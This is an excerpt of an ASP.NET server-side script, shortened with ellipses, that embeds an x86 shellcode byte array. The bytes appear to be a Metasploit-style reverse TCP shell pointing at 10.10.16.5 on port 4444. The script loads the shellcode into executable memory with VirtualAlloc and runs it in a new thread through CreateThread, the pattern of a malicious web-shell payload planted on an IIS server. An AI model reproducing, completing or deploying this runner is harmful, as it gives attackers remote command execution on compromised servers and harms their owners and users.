...
<script runat="server">
    ...
    {
        byte[] bSu8MDTM = new byte[354] {
0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x89,0xe5,0x8b,0x72,0x28,0x0f,
...
0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x0a,0x10,0x05,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr uLMdd9KNaK = VirtualAlloc(IntPtr.Zero,(UIntPtr)bSu8MDTM.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(bSu8MDTM,0,uLMdd9KNaK,bSu8MDTM.Length);
        IntPtr wKt = IntPtr.Zero;
        IntPtr sru = CreateThread(IntPtr.Zero,UIntPtr.Zero,uLMdd9KNaK,IntPtr.Zero,0,ref wKt);
    }
</script>
